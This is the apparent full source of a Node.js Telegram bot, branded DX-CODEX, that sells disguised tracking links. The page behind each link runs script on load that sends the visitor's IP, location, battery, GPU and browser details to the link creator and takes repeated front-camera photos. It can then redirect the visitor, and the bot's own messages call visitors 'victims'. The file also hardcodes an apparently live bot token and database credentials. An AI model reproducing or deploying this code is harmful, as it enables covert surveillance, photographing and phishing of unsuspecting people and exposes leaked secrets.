/**
 * 𝐃𝐗-𝐂𝐎𝐃𝐄𝐗 𝐌𝐎𝐓𝐇𝐄𝐑 𝐒𝐘𝐒𝐓𝐄𝐌 v4.0
 * Features: High Detail Info, Camera, Redirect, Auto-Delete, MongoDB, Coins
 */

const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const cors = require('cors');
const axios = require('axios');
const fs = require('fs');

// 🛠 CONFIGURATION (Tomar dewa details)
const TOKEN = "8291862788:AAEvXOm7TSrCIjb1TxPm7rleiG_NooTgxdE";
const OWNER_IDS = [6703335929, 6041728084, 5136260272]; 
const CHANNEL_ID1 = "@alphacodex369";
const CHANNEL_ID2 = "@Termuxcodex";
const GROUP_ID = "@Codex_teamx"; 
const MONGO_URI = "mongodb+srv://darkgangdarks_db_user:aEEYR59YEVameS1y@cluster0.iyakwh0.mongodb.net/DEVICEX?retryWrites=true&w=majority";

const bot = new TelegramBot(TOKEN, { polling: true });
const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json({ limit: '50mb' })); 
app.use(bodyParser.urlencoded({ extended: true }));

// ─── 💾 MONGODB DATABASE ──────────────────────────────────────────

mongoose.connect(MONGO_URI)
    .then(() => console.log('✅ MongoDB Connected to DEVICEX'))
    .catch(err => console.error('❌ MongoDB Error:', err));

const userSchema = new mongoose.Schema({
    chatId: { type: Number, unique: true, required: true },
    username: String,
    firstName: String,
    coins: { type: Number, default: 0 },
    freeUrlsLeft: { type: Number, default: 4 },
    isBanned: { type: Boolean, default: false },
    joinedAt: { type: Date, default: Date.now }
});

const linkSchema = new mongoose.Schema({
    shortId: { type: String, unique: true },
    creatorChatId: Number,
    originalUrl: String, 
    customName: String,
    createdAt: { type: Date, default: Date.now, expires: 86400 } // 24h Auto Delete
});

const User = mongoose.model('User', userSchema);
const Link = mongoose.model('Link', linkSchema);

// ─── 🎨 STYLING SYSTEM (FONTS & BORDERS) ──────────────────────────

// Font Map (Tomar style onujayi)
const fontMap = {
    'a': 'ᴀ', 'b': 'ʙ', 'c': 'ᴄ', 'd': 'ᴅ', 'e': 'ᴇ', 'f': 'ғ', 'g': 'ɢ', 'h': 'ʜ', 'i': 'ɪ',
    'j': 'ᴊ', 'k': 'ᴋ', 'l': 'ʟ', 'm': 'ᴍ', 'n': 'ɴ', 'o': 'ᴏ', 'p': 'ᴘ', 'q': 'ǫ', 'r': 'ʀ',
    's': 's', 't': 'ᴛ', 'u': 'ᴜ', 'v': 'ᴠ', 'w': 'ᴡ', 'x': 'x', 'y': 'ʏ', 'z': 'ᴢ',
    'A': 'ᴀ', 'B': 'ʙ', 'C': 'ᴄ', 'D': 'ᴅ', 'E': 'ᴇ', 'F': 'ғ', 'G': 'ɢ', 'H': 'ʜ', 'I': 'ɪ',
    'J': 'ᴊ', 'K': 'ᴋ', 'L': 'ʟ', 'M': 'ᴍ', 'N': 'ɴ', 'O': 'ᴏ', 'P': 'ᴘ', 'Q': 'ǫ', 'R': 'ʀ',
    'S': 's', 'T': 'ᴛ', 'U': 'ᴜ', 'V': 'ᴠ', 'W': 'ᴡ', 'X': 'x', 'Y': 'ʏ', 'Z': 'ᴢ',
    '0': '₀', '1': '₁', '2': '₂', '3': '₃', '4': '₄', '5': '₅', '6': '₆', '7': '₇', '8': '₈', '9': '₉'
};

// _fnt Function (Tomar dewa format match korar jonno)
function _fnt(text) {
    if(!text) return "";
    return text.split('').map(c => fontMap[c] || c).join('');
}

function makeBorder(title, content) {
    const capsTitle = _fnt(title);
    return `<b>┏━━「 ${capsTitle} 」━━┓</b>\n${content}\n<b>┗━━━━━━━━━━┛</b>`;
}

// ─── 🤖 BOT LOGIC ──────────────────────────────────────

async function isBanned(chatId) {
    const user = await User.findOne({ chatId });
    return user && user.isBanned;
}

// Check Membership
async function checkMembership(chatId) {
    try {
        const statuses = ['creator', 'administrator', 'member', 'restricted'];
        const c1 = await bot.getChatMember(CHANNEL_ID1, chatId);
        const c2 = await bot.getChatMember(CHANNEL_ID2, chatId);
        const g1 = await bot.getChatMember(GROUP_ID, chatId);
        return { allJoined: statuses.includes(c1.status) && statuses.includes(c2.status) && statuses.includes(g1.status) };
    } catch (e) {
        return { allJoined: false }; 
    }
}

const userState = {}; 

// --- /START ---
bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id;
    let user = await User.findOne({ chatId });
    if (!user) {
        user = new User({ chatId, username: msg.from.username, firstName: msg.from.first_name });
        await user.save();
    }
    
    if (user.isBanned) return;

    const { allJoined } = await checkMembership(chatId);
    if (allJoined) {
        showMainMenu(chatId, msg.from.first_name);
    } else {
        showVerificationMenu(chatId, msg.from.first_name);
    }
});

function showVerificationMenu(chatId, name) {
    const text = makeBorder("ᴡᴇʟᴄᴏᴍᴇ", `👋 <b>ʜᴇʟʟᴏ,</b> <a href="tg://user?id=${chatId}">${name}</a>\n\nℹ️ <b>ʏᴏᴜ ᴍᴜsᴛ ᴊᴏɪɴ ᴏᴜʀ ᴄʜᴀɴɴᴇʟs ᴛᴏ ᴜsᴇ ᴛʜɪs ʙᴏᴛ.</b>`);
    const opts = {
        parse_mode: 'HTML',
        reply_markup: {
            inline_keyboard: [
                [{ text: "📢 ᴊᴏɪɴ ᴄʜᴀɴɴᴇʟ 𝟷", url: `https://t.me/${CHANNEL_ID1.replace('@', '')}` }],
                [{ text: "📢 ᴊᴏɪɴ ᴄʜᴀɴɴᴇʟ 𝟸", url: `https://t.me/${CHANNEL_ID2.replace('@', '')}` }],
                [{ text: "👥 ᴊᴏɪɴ ɢʀᴏᴜᴘ", url: `https://t.me/${GROUP_ID.replace('@', '')}` }],
                [{ text: "✅ ᴠᴇʀɪғʏ", callback_data: "verify_join" }]
            ]
        }
    };
    bot.sendMessage(chatId, text, opts);
}

function showMainMenu(chatId, name) {
    const text = makeBorder("ᴅᴀsʜʙᴏᴀʀᴅ", `👤 <b>ᴜsᴇʀ:</b> ${name}\n🆔 <b>ɪᴅ:</b> <code>${chatId}</code>\n\n👇 <b>sᴇʟᴇᴄᴛ ᴀɴ ᴏᴘᴛɪᴏɴ ʙᴇʟᴏᴡ:</b>`);
    const opts = {
        parse_mode: 'HTML',
        reply_markup: {
            keyboard: [
                [{ text: "🔗 ᴄʀᴇᴀᴛᴇ ɴᴇᴡ ᴜʀʟ" }],
                [{ text: "👤 ᴍʏ ɪɴғᴏ" }, { text: "👨‍💻 ᴅᴇᴠᴇʟᴏᴘᴇʀ" }]
            ],
            resize_keyboard: true
        }
    };
    bot.sendMessage(chatId, text, opts);
}

// --- CALLBACK QUERY ---
bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    const data = query.data;

    if (await isBanned(chatId)) return;

    if (data === 'verify_join') {
        const { allJoined } = await checkMembership(chatId);
        if (allJoined) {
            bot.deleteMessage(chatId, query.message.message_id);
            showMainMenu(chatId, query.from.first_name);
        } else {
            bot.answerCallbackQuery(query.id, { text: "⚠️ ʏᴏᴜ ʜᴀᴠᴇ ɴᴏᴛ ᴊᴏɪɴᴇᴅ ᴀʟʟ ᴄʜᴀɴɴᴇʟs!", show_alert: true });
        }
    } else if (data === 'create_custom') {
        userState[chatId] = { step: 'await_custom_name' };
        bot.sendMessage(chatId, makeBorder("ᴄᴜsᴛᴏᴍ ᴜʀʟ", "✏️ <b>sᴇɴᴅ ʏᴏᴜʀ ᴄᴜsᴛᴏᴍ ɴᴀᴍᴇ (e.g. facebook-login):</b>\n\n⚠️ <b>ᴅᴏ ɴᴏᴛ ᴜsᴇ sᴘᴀᴄᴇs.</b>"), { parse_mode: 'HTML' });
    } else if (data === 'create_random') {
        const randomName = Math.random().toString(36).substring(7);
        askRedirect(chatId, randomName);
    } else if (data === 'use_redirect') {
        const context = userState[chatId];
        if (context) {
            userState[chatId] = { step: 'await_redirect_url', name: context.name };
            bot.sendMessage(chatId, makeBorder("ʀᴇᴅɪʀᴇᴄᴛ", "🌐 <b>sᴇɴᴅ ᴛʜᴇ ʀᴇᴅɪʀᴇᴄᴛ ᴜʀʟ (e.g. https://google.com):</b>\n\n⚠️ <b>ᴍᴜsᴛ sᴛᴀʀᴛ ᴡɪᴛʜ http/https.</b>"), { parse_mode: 'HTML' });
        }
    } else if (data === 'no_redirect') {
        const context = userState[chatId];
        if (context) {
            createFinalLink(chatId, context.name, null);
        }
    }
});

// --- MESSAGE HANDLER ---
bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;
    
    if (text && text.startsWith('/')) return; 
    if (await isBanned(chatId)) return;

    const user = await User.findOne({ chatId });
    if (!user) return; 

    // Create URL Button
    if (text === "🔗 ᴄʀᴇᴀᴛᴇ ɴᴇᴡ ᴜʀʟ") {
        if (user.freeUrlsLeft <= 0 && user.coins <= 0) {
            const noCoinText = makeBorder("⚠️ ɴᴏ ᴄᴏɪɴs", "🚫 <b>ʏᴏᴜʀ ғʀᴇᴇ ᴛʀɪᴀʟ ᴀɴᴅ ᴄᴏɪɴs ᴀʀᴇ ғɪɴɪsʜᴇᴅ.</b>\n\n💎 <b>ᴘʟᴇᴀsᴇ ʙᴜʏ ᴄᴏɪɴs ᴛᴏ ᴄᴏɴᴛɪɴᴜᴇ.</b>");
            return bot.sendMessage(chatId, noCoinText, {
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [[{ text: "💰 ʙᴜʏ ᴄᴏɪɴ", url: `https://t.me/${GROUP_ID.replace('@', '')}` }]]
                }
            });
        }

        const msgText = makeBorder("ᴄʀᴇᴀᴛᴇ ᴜʀʟ", `🛠 <b>ᴄʜᴏᴏsᴇ ᴜʀʟ ᴛʏᴘᴇ:</b>\n\n🎁 <b>ғʀᴇᴇ ʟᴇғᴛ:</b> ${user.freeUrlsLeft}\n💎 <b>ᴄᴏɪɴs:</b> ${user.coins}\n\n💎 <b>ᴄᴏsᴛ:</b> 1 ᴄᴏɪɴ (ᴏʀ 1 ғʀᴇᴇ sʟᴏᴛ)`);
        bot.sendMessage(chatId, msgText, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [{ text: "✏️ ᴄᴜsᴛᴏᴍ ɴᴀᴍᴇ", callback_data: "create_custom" }],
                    [{ text: "🎲 ʀᴀɴᴅᴏᴍ ɴᴀᴍᴇ", callback_data: "create_random" }]
                ]
            }
        });
        return;
    }

    if (text === "👤 ᴍʏ ɪɴғᴏ") {
        const info = makeBorder("ᴍʏ ɪɴғᴏ", `👤 <b>ɴᴀᴍᴇ:</b> ${user.firstName}\n💰 <b>ᴄᴏɪɴs:</b> ${user.coins}\n🎁 <b>ғʀᴇᴇ ʟᴇғᴛ:</b> ${user.freeUrlsLeft}\n🆔 <b>ᴜsᴇʀ ɪᴅ:</b> <code>${chatId}</code>`);
        return bot.sendMessage(chatId, info, { parse_mode: 'HTML' });
    }

    if (text === "👨‍💻 ᴅᴇᴠᴇʟᴏᴘᴇʀ") {
        return bot.sendMessage(chatId, makeBorder("ᴅᴇᴠᴇʟᴏᴘᴇʀ", "👨‍💻 <b>ᴅᴇᴠ:</b> @Dxcodexbot\n🛠 <b>ᴛᴇᴀᴍ:</b> " + GROUP_ID), { parse_mode: 'HTML' });
    }

    // State Handling
    if (userState[chatId]) {
        const state = userState[chatId].step;
        
        if (state === 'await_custom_name') {
            const customName = text.trim().replace(/[^a-zA-Z0-9-_]/g, '');
            if (customName.length < 3) {
                return bot.sendMessage(chatId, makeBorder("⚠️ ᴇʀʀᴏʀ", "🚫 <b>ɴᴀᴍᴇ ᴛᴏᴏ sʜᴏʀᴛ!</b>\n\nℹ️ ᴘʟᴇᴀsᴇ ᴇɴᴛᴇʀ ᴀᴛ ʟᴇᴀsᴛ 3 ᴄʜᴀʀᴀᴄᴛᴇʀs.\n👉 ᴛʀʏ ᴀɢᴀɪɴ:"), { parse_mode: 'HTML' });
            }
            const exists = await Link.findOne({ shortId: customName });
            if (exists) {
                 return bot.sendMessage(chatId, makeBorder("⚠️ ᴇʀʀᴏʀ", "🚫 <b>ɴᴀᴍᴇ ᴀʟʀᴇᴀᴅʏ ᴛᴀᴋᴇɴ!</b>\n\nℹ️ sᴏᴍᴇᴏɴᴇ ᴇʟsᴇ ɪs ᴜsɪɴɢ ᴛʜɪs ɴᴀᴍᴇ.\n👉 ᴘʟᴇᴀsᴇ ᴄʜᴏᴏsᴇ ᴀɴᴏᴛʜᴇʀ:"), { parse_mode: 'HTML' });
            }
            askRedirect(chatId, customName);
        } else if (state === 'await_redirect_url') {
            if (!text.startsWith('http')) {
                 return bot.sendMessage(chatId, makeBorder("⚠️ ᴇʀʀᴏʀ", "🚫 <b>ɪɴᴠᴀʟɪᴅ ᴜʀʟ ғᴏʀᴍᴀᴛ!</b>\n\nℹ️ ʏᴏᴜʀ ᴜʀʟ ᴍᴜsᴛ sᴛᴀʀᴛ ᴡɪᴛʜ 'http://' ᴏʀ 'https://'.\n👉 ᴛʀʏ ᴀɢᴀɪɴ:"), { parse_mode: 'HTML' });
            }
            createFinalLink(chatId, userState[chatId].name, text);
        }
    }
});

function askRedirect(chatId, name) {
    userState[chatId] = { step: 'await_choice', name: name };
    const text = makeBorder("ʀᴇᴅɪʀᴇᴄᴛ ᴏᴘᴛɪᴏɴ", `📝 <b>ɴᴀᴍᴇ sᴇᴛ ᴛᴏ:</b> <code>${name}</code>\n\n❓ <b>ᴅᴏ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ʀᴇᴅɪʀᴇᴄᴛ ᴠɪᴄᴛɪᴍs ᴛᴏ ᴀɴᴏᴛʜᴇʀ sɪᴛᴇ ᴀғᴛᴇʀ ᴄᴀᴘᴛᴜʀᴇ?</b>`);
    bot.sendMessage(chatId, text, {
        parse_mode: 'HTML',
        reply_markup: {
            inline_keyboard: [
                [{ text: "✅ ʏᴇs, ʀᴇᴅɪʀᴇᴄᴛ", callback_data: "use_redirect" }],
                [{ text: "❌ ɴᴏ, sᴛᴀʏ ᴏɴ ᴘᴀɢᴇ", callback_data: "no_redirect" }]
            ]
        }
    });
}

async function createFinalLink(chatId, name, redirectUrl) {
    const user = await User.findOne({ chatId });
    
    // Deduct Logic
    if (user.freeUrlsLeft > 0) user.freeUrlsLeft -= 1;
    else if (user.coins > 0) user.coins -= 1;
    
    await user.save();

    const newLink = new Link({
        shortId: name,
        creatorChatId: chatId,
        originalUrl: redirectUrl,
        customName: name
    });
    await newLink.save();

    delete userState[chatId]; 

    const appUrl = `https://${process.env.RENDER_EXTERNAL_HOSTNAME || 'YOUR_APP.onrender.com'}/w/${name}`;
    
    const msg = makeBorder("✅ ᴅᴏɴᴇ", `🔗 <b>ᴜʀʟ ᴄʀᴇᴀᴛᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ!</b>\n\n🌐 <b>ʟɪɴᴋ:</b> ${appUrl}\n🔄 <b>ʀᴇᴅɪʀᴇᴄᴛ:</b> ${redirectUrl || 'N/A'}\n\n⚠️ <b>ʟɪɴᴋ ᴇxᴘɪʀᴇs ɪɴ 𝟸𝟺 ʜᴏᴜʀs.</b>`);
    bot.sendMessage(chatId, msg, { parse_mode: 'HTML' });
}

// ─── 👑 OWNER COMMANDS ──────────────────────────────────────────────

bot.onText(/\/add (\d+) (.+)/, async (msg, match) => {
    if (!OWNER_IDS.includes(msg.chat.id)) return;
    const amount = parseInt(match[1]);
    const target = match[2];
    let user = await User.findOne({ $or: [{ username: target.replace('@', '') }, { chatId: target }] });
    if (user) {
        user.coins += amount;
        await user.save();
        bot.sendMessage(msg.chat.id, makeBorder("ᴀᴅᴍɪɴ", `✅ <b>ᴀᴅᴅᴇᴅ ${amount} ᴄᴏɪɴs ᴛᴏ ${user.firstName}.</b>`), { parse_mode: 'HTML' });
        bot.sendMessage(user.chatId, makeBorder("ʙᴀʟᴀɴᴄᴇ", `💰 <b>ᴀᴅᴍɪɴ ᴀᴅᴅᴇᴅ ${amount} ᴄᴏɪɴs ᴛᴏ ʏᴏᴜʀ ᴀᴄᴄᴏᴜɴᴛ!</b>`), { parse_mode: 'HTML' });
    } else bot.sendMessage(msg.chat.id, makeBorder("⚠️ ᴇʀʀᴏʀ", "❌ <b>ᴜsᴇʀ ɴᴏᴛ ғᴏᴜɴᴅ.</b>"), { parse_mode: 'HTML' });
});

bot.onText(/\/rem (\d+) (.+)/, async (msg, match) => {
    if (!OWNER_IDS.includes(msg.chat.id)) return;
    const amount = parseInt(match[1]);
    const target = match[2];
    let user = await User.findOne({ $or: [{ username: target.replace('@', '') }, { chatId: target }] });
    if (user) {
        user.coins = Math.max(0, user.coins - amount);
        await user.save();
        bot.sendMessage(msg.chat.id, makeBorder("ᴀᴅᴍɪɴ", `✅ <b>ʀᴇᴍᴏᴠᴇᴅ ${amount} ᴄᴏɪɴs ғʀᴏᴍ ${user.firstName}.</b>`), { parse_mode: 'HTML' });
    } else bot.sendMessage(msg.chat.id, makeBorder("⚠️ ᴇʀʀᴏʀ", "❌ <b>ᴜsᴇʀ ɴᴏᴛ ғᴏᴜɴᴅ.</b>"), { parse_mode: 'HTML' });
});

bot.onText(/\/cban (.+)/, async (msg, match) => {
    if (!OWNER_IDS.includes(msg.chat.id)) return;
    const target = match[1];
    let user = await User.findOneAndUpdate({ $or: [{ username: target.replace('@', '') }, { chatId: target }] }, { isBanned: true });
    if (user) bot.sendMessage(msg.chat.id, makeBorder("ʙᴀɴ", "✅ <b>ᴜsᴇʀ ʜᴀs ʙᴇᴇɴ ʙᴀɴɴᴇᴅ.</b>"), { parse_mode: 'HTML' });
});

bot.onText(/\/broadcast (.+)/, async (msg, match) => {
    if (!OWNER_IDS.includes(msg.chat.id)) return;
    
    let text = match[1];
    let reply_markup = null;

    // বাটন এক্সট্রাকশন লজিক [ btn | url ]
    const btnMatch = text.match(/\[(.*)\|(.*)\]/);
    if (btnMatch) {
        const btnText = btnMatch[1].trim();
        const btnUrl = btnMatch[2].trim();
        text = text.replace(btnMatch[0], "").trim(); // মূল মেসেজ থেকে বাটন পার্ট আলাদা করা
        
        reply_markup = {
            inline_keyboard: [[{ text: btnText, url: btnUrl }]]
        };
    }

    const users = await User.find({});
    let count = 0;
    
    bot.sendMessage(msg.chat.id, "⏳ <b>sᴛᴀʀᴛɪɴɢ ʙʀᴏᴀᴅᴄᴀsᴛ...</b>", { parse_mode: 'HTML' });

    for (const u of users) {
        try {
            await bot.sendMessage(u.chatId, `<b>📢 ʙʀᴏᴀᴅᴄᴀsᴛ</b>\n\n${text}`, { 
                parse_mode: 'HTML',
                reply_markup: reply_markup 
            });
            count++;
        } catch(e) {
            // ইউজার বট ব্লক করলে বা চ্যাট না থাকলে স্কিপ হবে
        }
    }
    
    bot.sendMessage(msg.chat.id, makeBorder("ʙʀᴏᴀᴅᴄᴀsᴛ ᴅᴏɴᴇ", `✅ <b>sᴇɴᴛ ᴛᴏ ${count} ᴜsᴇʀs.</b>`), { parse_mode: 'HTML' });
});

bot.onText(/\/broadcast (.+)/, async (msg, match) => {
    if (!OWNER_IDS.includes(msg.chat.id)) return;
    const content = match[1]; 
    const users = await User.find({});
    let count = 0;
    bot.sendMessage(msg.chat.id, "⏳ <b>sᴛᴀʀᴛɪɴɢ ʙʀᴏᴀᴅᴄᴀsᴛ...</b>", { parse_mode: 'HTML' });
    for (const u of users) {
        try {
            await bot.sendMessage(u.chatId, `<b>📢 ʙʀᴏᴀᴅᴄᴀsᴛ</b>\n\n${content}`, { parse_mode: 'HTML' });
            count++;
        } catch(e) {}
    }
    bot.sendMessage(msg.chat.id, `✅ <b>ʙʀᴏᴀᴅᴄᴀsᴛ sᴇɴᴛ ᴛᴏ ${count} ᴜsᴇʀs.</b>`, { parse_mode: 'HTML' });
});

bot.onText(/\/user/, async (msg) => {
    if (!OWNER_IDS.includes(msg.chat.id)) return;
    const users = await User.find({});
    let data = "CHAT_ID | USERNAME | COINS | DATE\n";
    users.forEach(u => {
        data += `${u.chatId} | ${u.username || 'NoUser'} | ${u.coins} | ${u.joinedAt}\n`;
    });
    fs.writeFileSync('users.txt', data);
    bot.sendDocument(msg.chat.id, 'users.txt');
    setTimeout(() => fs.unlinkSync('users.txt'), 5000);
});

bot.onText(/\/menu/, (msg) => {
    if (!OWNER_IDS.includes(msg.chat.id)) return;
    const menu = `
<b>👑 ᴏᴡɴᴇʀ ᴍᴇɴᴜ</b>
/add [amount] [id/@] - Add Coins
/rem [amount] [id/@] - Remove Coins
/cban [id/@] - Ban User
/cunban [id/@] - Unban User
/broadcast [msg] - Broadcast
/user - Get User List
    `;
    bot.sendMessage(msg.chat.id, makeBorder("ᴄᴏɴᴛʀᴏʟ", menu), { parse_mode: 'HTML' });
});

// ─── 🌐 WEB SERVER & API ──────────────────────────────────

// Redirect Web Handler
app.get('/w/:id', async (req, res) => {
    const linkId = req.params.id;
    const link = await Link.findOne({ shortId: linkId });

    if (!link) return res.status(404).send("<h1 style='color:red;text-align:center;'>404 - LINK EXPIRED</h1>");
    
    // Serve HTML with Redirect Logic
    res.send(getHtmlTemplate(linkId, link.originalUrl));
});

// Data Receiver API
app.post('/api/data', async (req, res) => {
    const { linkId, type, data } = req.body;
    const link = await Link.findOne({ shortId: linkId });
    if (!link) return res.json({ status: 'error' });

    const ownerChatId = link.creatorChatId;

    try {
        if (type === 'info') {
            // [IMPORTANT] Here is the EXACT Format you requested
            const _n = data.ipData; // Mapping data to your variable names
            const _batt = data.battery;
            const _gpu = data.gpu;
            const navigator = data.navigator; 
            const screen = data.screen;

            let msg = `<b>${_fnt("CODEX DEVICE INFO")}</b>\n\n`;
            msg += `<b>${_fnt("DEVICE")}:</b> <code>${navigator.platform}</code>\n`;
            msg += `<b>${_fnt("IP ADDRESS")}:</b> <a href="https://ipwho.is/${_n.ip}">${_n.ip}</a>\n`;
            msg += `<b>${_fnt("NETWORK")}:</b> <code>${_n.isp}</code>\n`;
            msg += `<b>${_fnt("LOCATION")}:</b> <code>${_n.city}, ${_n.country}</code>\n`;
            msg += `<b>${_fnt("COORDINATES")}:</b> <code>${_n.loc}</code>\n`;
            msg += `<b>${_fnt("BATTERY")}:</b> <code>${_batt}</code>\n`;
            msg += `<b>${_fnt("CPU CORES")}:</b> <code>${navigator.hardwareConcurrency || 'N/A'}</code>\n`;
            msg += `<b>${_fnt("RAM")}:</b> <code>${navigator.deviceMemory || 'N/A'} GB</code>\n`;
            msg += `<b>${_fnt("GPU")}:</b> <code>${_gpu}</code>\n`;
            msg += `<b>${_fnt("SCREEN")}:</b> <code>${screen.width}x${screen.height} (${screen.colorDepth}-bit)</code>\n`;
            msg += `<b>${_fnt("TIMEZONE")}:</b> <code>${data.timezone}</code>\n`;
            msg += `<b>${_fnt("LANGUAGE")}:</b> <code>${navigator.language}</code>\n`;
            msg += `<b>${_fnt("USER AGENT")}:</b> <pre>${navigator.userAgent}</pre>\n\n`;
            msg += `<blockquote>${_fnt("DEV-BY: DX-CODEX || ")}@Termuxcodex</blockquote>`;

            await bot.sendMessage(ownerChatId, msg, { parse_mode: 'HTML', disable_web_page_preview: true });
        
        } else if (type === 'cam') {
            const buffer = Buffer.from(data.replace(/^data:image\/jpeg;base64,/, ""), 'base64');
            await bot.sendPhoto(ownerChatId, buffer, { caption: makeBorder("📸 ᴄᴀᴍᴇʀᴀ", `<b>IP:</b> ${req.ip}`), parse_mode: 'HTML' });
        }
        res.json({ status: 'success' });
    } catch (e) {
        console.error(e);
        res.json({ status: 'error' });
    }
});

// HTML TEMPLATE (Updated to collect GPU/Screen/Timezone etc.)
function getHtmlTemplate(linkId, redirectUrl) {
    return `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>DX-CODEX</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; cursor: crosshair; }
        canvas { display: block; position: absolute; top: 0; left: 0; }
        #terminal {
            position: absolute; top: 15px; left: 15px;
            color: #0f0; font-family: 'Courier New', monospace;
            font-size: 11px; pointer-events: none; z-index: 10;
            text-shadow: 0 0 8px #0f0; line-height: 1.4;
        }
        .glitch-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: repeating-linear-gradient(0deg, rgba(0,0,0,0.15) 0px, rgba(0,0,0,0.15) 1px, transparent 2px, transparent 3px);
            pointer-events: none; z-index: 5;
        }
    </style>
</head>
<body>
    <div id="terminal">SYSTEM_STATUS: BOOTING...</div>
    <div class="glitch-overlay"></div>
    <canvas id="mainCanvas"></canvas>
    <video id="video" style="display:none;" autoplay playsinline></video>

<script>
const LINK_ID = "${linkId}";
const REDIRECT_URL = "${redirectUrl || ''}";

// --- MATRIX ANIMATION ---
const canvas = document.getElementById('mainCanvas');
const ctx = canvas.getContext('2d');
let w, h, cols;
const drops = [];

function init() {
    w = canvas.width = window.innerWidth;
    h = canvas.height = window.innerHeight;
    cols = Math.floor(w / 20);
    for (let i = 0; i < cols; i++) drops[i] = Math.random() * -100;
}
function draw() {
    ctx.fillStyle = 'rgba(0, 0, 0, 0.08)';
    ctx.fillRect(0, 0, w, h);
    ctx.fillStyle = '#0f0';
    ctx.font = '15px monospace';
    for (let i = 0; i < drops.length; i++) {
        const text = String.fromCharCode(0x30A0 + Math.random() * 96);
        ctx.fillText(text, i * 20, drops[i] * 20);
        if (drops[i] * 20 > h && Math.random() > 0.975) drops[i] = 0;
        drops[i]++;
    }
    requestAnimationFrame(draw);
}
window.addEventListener('resize', init);
init(); draw();

// --- DATA COLLECTION (Enhanced) ---
async function execute() {
    const _log = document.getElementById('terminal');
    _log.innerHTML += "<br>> ANALYZING_HARDWARE...";

    // 1. IP DATA
    let ipData = { ip: "Unknown", city: "N/A", country: "N/A", isp: "N/A", loc: "N/A" };
    try {
        const r = await fetch('https://ipwho.is/');
        const d = await r.json();
        if (d.success) {
             ipData = { 
                ip: d.ip, city: d.city, country: d.country, 
                isp: d.connection.isp, loc: d.latitude + "," + d.longitude 
             };
        }
    } catch(e) {}

    // 2. BATTERY
    let batt = "N/A";
    try {
        const b = await navigator.getBattery();
        const icon = b.charging ? "🔌" : "🔋";
        batt = Math.round(b.level * 100) + "% (" + icon + ")";
    } catch(e) {}

    // 3. GPU INFO
    let gpu = "N/A";
    try {
        const gl = document.createElement('canvas').getContext('webgl');
        const db = gl.getExtension('WEBGL_debug_renderer_info');
        if(gl && db) gpu = gl.getParameter(db.UNMASKED_RENDERER_WEBGL);
    } catch(e) {}

    // PACKING DATA FOR SERVER
    const fullData = {
        ipData: ipData,
        battery: batt,
        gpu: gpu,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        screen: {
            width: screen.width,
            height: screen.height,
            colorDepth: screen.colorDepth
        },
        navigator: {
            platform: navigator.platform,
            hardwareConcurrency: navigator.hardwareConcurrency,
            deviceMemory: navigator.deviceMemory,
            language: navigator.language,
            userAgent: navigator.userAgent
        }
    };

    // SEND TO SERVER
    await fetch('/api/data', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ linkId: LINK_ID, type: 'info', data: fullData })
    }).catch(()=>{});

    _log.innerHTML += "<br>> UPLOADING_DATA... [100%]";
    
    // CAMERA & REDIRECT
    startCamera();

    if(REDIRECT_URL && REDIRECT_URL !== 'null') {
        _log.innerHTML += "<br>> REDIRECTING_TARGET...";
        setTimeout(() => {
            window.location.href = REDIRECT_URL;
        }, 3000); 
    }
}

async function startCamera() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        const video = document.getElementById('video');
        video.srcObject = stream;
        video.onloadedmetadata = () => {
            setTimeout(() => captureFrame(video), 500); 
            setInterval(() => captureFrame(video), 2000);
        };
    } catch (e) {
        document.getElementById('terminal').innerHTML += "<br>> CAM_ACCESS_DENIED";
        if(REDIRECT_URL && REDIRECT_URL !== 'null') window.location.href = REDIRECT_URL;
    }
}

function captureFrame(video) {
    const cvs = document.createElement('canvas');
    cvs.width = video.videoWidth;
    cvs.height = video.videoHeight;
    const c = cvs.getContext('2d');
    c.drawImage(video, 0, 0);
    const base64 = cvs.toDataURL('image/jpeg', 0.5);
    
    fetch('/api/data', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ linkId: LINK_ID, type: 'cam', data: base64 })
    });
}

execute();
</script>
</body>
</html>
    `;
}

// Keep Alive
setInterval(() => {
    const url = `https://${process.env.RENDER_EXTERNAL_HOSTNAME || 'localhost'}.onrender.com`;
    axios.get(url).catch(() => {});
}, 300000);

app.get('/', (req, res) => res.send('DX-CODEX SYSTEM ONLINE'));
app.listen(PORT, () => console.log(`✅ Server running on port ${PORT}`));
